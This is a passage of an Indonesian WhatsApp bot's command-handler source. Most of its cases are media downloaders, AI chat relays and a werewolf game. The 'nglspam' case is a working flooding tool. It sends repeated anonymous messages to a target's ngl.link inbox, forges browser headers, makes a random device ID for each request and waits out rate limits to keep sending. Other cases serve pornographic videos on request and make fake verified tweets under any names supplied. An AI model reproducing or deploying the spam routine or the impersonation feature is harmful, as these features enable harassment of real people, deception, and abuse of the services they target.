 if (!text) {
 return m.reply("✨ *Masukkan Pertanyaan Anda Kepada Latukam Sang Jomok!* ✨");
 }
 try {
 let ai = await axios.get(`https://api.siputzx.my.id/ai/latukam?content=${text}`);
 let response = ai.data.data;
 let data = response.replace(/\*\*/g, "*");
 await m.reply(data);
 } catch (error) {
 //m.reply(`❌ *Terjadi Kesalahan, Coba Lagi!* ❌\nPesan kesalahan: *${error.message}*`);
 }
 }
 //D|ts si pler 🐎
break 

case 'tolinkk': {
if (!/video/.test(mime) && !/image/.test(mime)) reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let { TelegraPh } = require('./sistem-asuma/uploader.js')
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
m.reply(util.format(anu))
await fs.unlinkSync(media)
}
//D|ts si pler 🐎
break 

case "facebook": case "fb": {
if (!text.includes("facebook.com")) return m.reply("Masukan link facebook!")
try {
 axios({ "method": "GET", "url": "https://mannoffc-x.hf.space/download/facebook", "params": { "url": text }}).then(_ => {
 Ditss.sendMessage(m.chat, { video: { url: _.data.result.video }, caption: "" }, { quoted: m })
 })
} catch ({ message }) {
 m.reply(message)
}
}
//D|ts si pler 🐎
break 



		case 'threads': {
			if (!text) return m.reply(`*Anda Perlu Memberikan URL Video, Postingan, Gambar Threads Apa Pun*`)
			m.reply(mess.wait)
			const createImage = async (url) => {
				const {
					imageMessage
				} = await generateWAMessageContent({
					image: {
						url
					}
				}, {
					upload: Ditss.waUploadToServer
				});
				return imageMessage;
			};
			const createVideo = async (url) => {
				const {
					videoMessage
				} = await generateWAMessageContent({
					video: {
						url
					}
				}, {
					upload: Ditss.waUploadToServer
				});
				return videoMessage;
			};
			let res;
			try {
				res = await fetch(`https://api.betabotz.eu.org/api/download/threads?url=${text}?igshid=NTc4MTIwNjQ2YQ==&apikey=GetsuzoZhiro`);
			} catch (error) {
				return reply(`Terjadi kesalahan: ${error.message}`);
			}
			let api_response = await res.json();
			if (!api_response || !api_response.result) {
				return reply(`Tidak Ada Video Atau Gambar Yang Ditemukan Atau Respon Dari Api Tidak Valid.`);
			}
			const imageUrls = api_response.result.image_urls;
			const videoUrls = api_response.result.video_urls;
			const mediaCards = [];
			if (videoUrls && videoUrls.length > 0) {
				for (const videoUrl of videoUrls) {
					mediaCards.push({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: 'VIDEO',
							hasMediaAttachment: true,
							videoMessage: await createVideo(videoUrl)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Hapus semua tombol
						})
					});
				}
			}
			if (imageUrls && imageUrls.length > 0) {
				for (const imageUrl of imageUrls) {
					mediaCards.push({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: 'IMAGE',
							hasMediaAttachment: true,
							imageMessage: await createImage(imageUrl)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Hapus semua tombol
						})
					});
				}
			}

			const msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						messageContextInfo: {
							deviceListMetadata: {},
							deviceListMetadataVersion: 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.fromObject({
							body: proto.Message.InteractiveMessage.Body.fromObject({
								text: `> Threads Media🦚`
							}),
							carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
								cards: mediaCards
							})
						})
					}
				}
			}, {});

			await Ditss.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			});
		}
		//D|ts si pler 🐎
break 

case 'nobg':
case 'removebg': {
if (!/image/.test(mime)) reply(`*Reply Image With Caption* ${prefix + command}`)
if (!quoted) reply(`*Reply Image With Caption* ${prefix + command}`)
let { TelegraPh } = require('./sistem-asuma/uploaderr')
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
await Ditss.sendMessage(m.chat, { image : { url : 'https://love.neekoi.me/r-bg?url=' + util.format(anu) }, caption: `ini... udah aku hapus :3` }, { quoted: m })
}
//D|ts si pler 🐎
break 

case 'bokep':{
if (!isCreator && !isPremium) return reply(mess.prem)
if (m.isGroup) return Reply('*`maybee` harap gunakan di private chat*')
const caption = `> ${command}`;
let heyy
if (/bokep/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ditss-dev/ditss/main/okep')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]

				Ditss.sendMessage(m.chat,{
			 video: {url:yeha},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.toaudio`,

							buttonText: {
								displayText: "back sound"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			//D|ts si pler 🐎
break 
        
        
        
case 'wwpc':
case 'ww':
case 'werewolf': {
//if (!isRegistered) return registerbut(noregis)
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./sistem-asuma/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    Ditss.werewolf = Ditss.werewolf ? Ditss.werewolf : {};
    const ww = Ditss.werewolf ? Ditss.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
            } else if (value === "join") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        Ditss.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
            } else if (value === "start") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(Ditss. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(Ditss. chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(Ditss. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${Ditss.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    await Ditss.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${Ditss.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await Ditss.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
                                            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${Ditss.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                    await Ditss.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${Ditss.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
                    await Ditss.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${Ditss.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                    await Ditss.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await Ditss.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(Ditss. chat, ww);
    } else if (value === "kill") {
       if (byId.db.role === "sorcerer") 
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return m.reply("Peran ini bukan untuk kamu"); 
             return m.reply("Tidak bisa menggunakan skill untuk teman"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
      reply("Berhasil membunuh player " + parseInt(target)) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
                 killWerewolf(sender, parseInt(target), ww); 
             }); 
     } else if (value === "dreamy") { 
         if (dataPlayer(sender, ww).role !== "seer") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let dreamy = dreamySeer(m.sender, parseInt(target), ww); 
         reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "deff") { 
         if (dataPlayer(sender, ww).role !== "guardian") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         reply(`Berhasil melindungi player ${target}`).then(() => { 
             protectGuardian(m.sender, parseInt(target), ww); 
             dataPlayer(sender, ww).status = true; 
         }); 
     } else if (value === "sorcerer") { 
         if (dataPlayer(sender, ww).role !== "sorcerer") 
             return m.reply("Peran ini bukan untuk kamu"); 
             if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let sorker = sorcerer(sesi(m.sender), target); 
          reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "vote") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return reply("Masukan nomor player");
        if (isNaN(target)) return reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                Ditss.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        Ditss.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        Ditss.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: `${global.linkSaluran}`,
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
//D|ts si pler 🐎
break 
        
case 'aimeta':{
if (!text) return reply('input text nya');
 try {
 const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(text)}`;
 const response = await fetch(apiUrl);
 const mark = await response.json();

 const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda.';

 await Ditss.sendMessage(m.chat, { text: ress }, {quoted:m});
 
} catch (error) {
 console.error("Terjadi kesalahan:", error.message);
}
}
//D|ts si pler 🐎
break 



case "twt": {
if (!text) return m.reply("Masukan teksnya!")
try {
 ppser = await Ditss.profilePictureUrl(m.sender, 'image');
} catch (e) {
 ppser = 'https://telegra.ph/file/68d47ac90bcc8ef1510fa.jpg';
}
let { data } = await axios.post('https://ruloaooa-swgen.hf.space/generate2', {
 avatar: ppser,
 username: m.pushName,
 text: text,
 countLike: (Math.floor(Math.random() * 10000))
}, { responseType: 'arraybuffer' })
Ditss.sendMessage(m.chat, { image: data })
}
//D|ts si pler 🐎
break 



/*case 'play4':{
if (!text) return m.reply(example("rumah ke rumah"))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]
var anu = await ytdl.ytmp3(`${res.url}`)
if (anu.status) {
let urlMp3 = anu.download.url
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
//let totalreg = Object.keys(db.list().user).length
const xmenu_oh = `${res.title}`

const resize = async(buffer, ukur1, ukur2) => {
 return new Promise(async(resolve, reject) => {
 let jimp = require('jimp')
 var baper = await jimp.read(buffer);
 var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
 resolve(ab)
 })
}

let deku = fs.readFileSync('./source/media/ch1.jpg')
let get = await resize(deku, 100, 100)
await Ditss.sendMessage(m.chat, {
 document: fs.readFileSync('./case.js'), fileName: `${botname} ${versi}`, mimetype: 'image/null', fileLength: 0, pageCount: '', jpegThumbnail: get,
 caption: xmenu_oh,
 footer: "Dits",
 buttons: [
 {
 buttonId: `.ytmp3 ${res.url}`, 
 buttonText: {
 displayText: 'get audio'
 }
 }, {
 buttonId: `.ytmp4 ${res.url}`, 
 buttonText: {
 displayText: "get video"
 }
 }
],
 viewOnce: true,
 headerType: 6,
 contextInfo: {
 isForwarded: true,
 forwardingScore: 99999,
 externalAdReply: {
 showAdAttribution: true,
 title: ` ditss | asuma multi device`,
 mediaType: 1,
 previewType: 1,
 body: `々 dits anjayy`,
 //previewType: "PHOTO",
 thumbnail: res.thumbnail,
 renderLargerThumbnail: true,
 mediaUrl: null,
 sourceUrl: null,
 },
 forwardedNewsletterMessageInfo: {
 newsletterJid: idSaluran,
 serverMessageId: -1,
 newsletterName: `Menu By: Hikaa`,
 }
 }
}, { quoted: m });

//await m.reply({ audio: { url: 'https://files.catbox.moe/s7avpq.mp3' }, mimetype: 'audio/mpeg', ptt: true })
}
break */

case 'nglspam': {
if (!isCreator && !isPremium) return reply(mess.prem)
 if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
 return m.reply("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam ditss|haloo|5");
 }
async function sendSpamMessage(username, message, spamCount) {
 let counter = 0;
 while (counter < spamCount) {
 try {
 const date = new Date();
 const minutes = date.getMinutes();
 const hours = date.getHours();
 const formattedDate = `${hours}:${minutes}`;
 const deviceId = crypto.randomBytes(21).toString('hex');
 const url = 'https://ngl.link/api/submit';
 const headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
 'Accept': '*/*',
 'Accept-Language': 'en-US,en;q=0.5',
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'X-Requested-With': 'XMLHttpRequest',
 'Sec-Fetch-Dest': 'empty',
 'Sec-Fetch-Mode': 'cors',
 'Sec-Fetch-Site': 'same-origin',
 'Referer': `https://ngl.link/${username}`,
 'Origin': 'https://ngl.link'
 };
 const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

 const response = await fetch(url, {
 method: 'POST',
 headers,
 body,
 mode: 'cors',
 credentials: 'include'
 });

 if (response.status !== 200) {
 console.log(`[${formattedDate}] [Err] Ratelimited`);
 await new Promise(resolve => setTimeout(resolve, 25000));
 } else {
 counter++;
 console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
 }
 } catch (error) {
 console.error(`[${formattedDate}] [Err] ${error}`);
 await new Promise(resolve => setTimeout(resolve, 5000));
 }
 }
};
 const [username, message, count] = text.split("|");
 const spamCount = parseInt(count, 10);

 if (isNaN(spamCount) || spamCount <= 0) {
 return m.reply("Jumlah spam harus berupa angka positif!");
 }

 try {
 await sendSpamMessage(username, message, spamCount);
 m.reply(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
 } catch (e) {
 console.error(e); // Menambahkan logging error untuk debug
 return m.reply("Fitur error, coba lagi nanti.");
 }
}
//D|ts si pler 🐎
break 



case 'faketweet':{
const canvafy = require('canvafy')
if (!text) return reply(`Exmaple : Name1 | Name2 | Text`)
 nama1 = text.split("|")[0]
 nama2 = text.split("|")[1]
 katakata = text.split("|")[2]
const tweet = await new canvafy.Tweet()
 .setTheme("dim")
 .setUser({displayName: nama1, username: nama2})
 .setVerified(true)
 .setComment(katakata)
 .setAvatar(ppuser)
 .build();
 let asumaMd = tweet
 Ditss.sendMessage(m.chat, { image: asumaMd, caption: 'Done' },{ quoted : m }) 
}
//D|ts si pler 🐎
break 



case 'spoiler':
case 'readmore':
case 'selengkapnya': {
if (!q) return reply(`masukan text contoh ${command} kamujelek|tapii boong`)
let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
reply(l + readmore + r)
}
//D|ts si pler 🐎
break 



case 'creatqr':
case 'qr':
case 'toqr':{
//if (!isRegistered) return registerbut(noregis)
if (!q) return reply('bloon ni anak')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
let qyuer = await qrcode.toDataURL(q, { scale: 35 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
let buff = getRandom('.jpg')
await fs.writeFileSync('./'+buff, data)
let medi = fs.readFileSync('./' + buff)
await Ditss.sendMessage(from, { image: medi, caption:"nih"}, { quoted: qkontak })
setTimeout(() => { fs.unlinkSync(buff) }, 10000)
}
//D|ts si pler 🐎
break 



case 'listban': 
//if (!isRegistered) return registerbut(noregis)
//let data = Object.values(db.users).filter(v => v.banned)

var data = Object.values(db.users).filter(v => v.banned)
var sider = []
if (data.length == 0) return reply('*Data kosong.*')
var teks = '乂 *L I S T B A N N E D*\n'
teks += data.map((v, i) => `\n${i + 1}. @${v.jid.split('@')[0]}`).join('\n')
/*Ditss.sendMessage(m.chat, teks, m, {
thumbUrl: 'https://telegra.ph/file/ae4413e295ec14491d23b.png',
largeThumb: true
})*/
//reply(teks)
Ditss.sendMessage(m.chat, { text: teks, mentions: [data.map]}, { quoted: qkontak })
break //Powered ByDitsS



case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) return reply(`Balas sticker dengan caption *${prefix + command}*`)
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Ditss.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
//D|ts si pler 🐎
break 



case 'fajar':


FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
//D|ts si pler 🐎
break 

case'z': case 'everyone': 
 if (!text) return m.reply("teks?")
 if (!isAdmins && !isCreator) return
